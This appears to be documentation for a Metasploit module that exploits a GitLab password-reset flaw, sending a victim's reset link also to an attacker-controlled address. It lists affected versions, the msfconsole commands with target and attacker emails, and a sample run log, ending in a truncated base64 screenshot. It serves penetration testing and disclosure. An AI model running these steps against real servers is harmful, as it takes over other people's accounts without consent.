## Vulnerable Application

This module exploits an account-take-over vulnerability that allows users
to take control of a gitlab account without user interaction.

The vulnerability lies in the password reset functionality. Its possible to provide 2 emails
and the reset code will be sent to both. It is therefore possible to provide the e-mail
address of the target account as well as that of one we control, and to reset the password.

2-factor authentication prevents this vulnerability from being exploitable. There is no
discernable difference between a vulnerable and non-vulnerable server response.

Vulnerable versions include:

 * 16.1 < 16.1.6,
 * 16.2 < 16.2.9,
 * 16.3 < 16.3.7,
 * 16.4 < 16.4.5,
 * 16.5 < 16.5.6,
 * 16.6 < 16.6.4,
 * 16.7 < 16.7.2

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/admin/http/gitlab_password_reset_account_takeover`
1. Do: `set targetemail [email]`
1. Do: `set myemail [email]`
1. Do: `run`
1. You should get a password reset email to take over the targeted account

## Options

### myemail

The email address to also receive a password reset email to.

### targetemail

The email address of the target which should be taken over.

## Scenarios

### 16.6.2-ee

```
$ ./msfconsole -qr gitlab
[*] Processing gitlab for ERB directives.
resource (gitlab)> use auxiliary/admin/http/gitlab_password_reset_account_takeover
resource (gitlab)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (gitlab)> set targetemail victim@example.com
targetemail => victim@example.com
resource (gitlab)> set myemail my_email@example.com
myemail => my_email@example.com
resource (gitlab)> set verbose true
verbose => true
msf6 auxiliary(scanner/admin/gitlab_password_reset_account_takeover) > exploit

[*] Obtaining CSRF token
[+] CSRF Token: URTwtcW7cTgXEoFoa0To9jTXCubxXpJwcCiLjXbrAIFeO5TJza9x-amxcWGmX2oC8SppWeTIIWUG19WCvW_2ig
[*] Sending password reset request
[+] Sent successfully, check my_email@example.com for a password reset link
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The following email was received:

![email](data:image/png;base64,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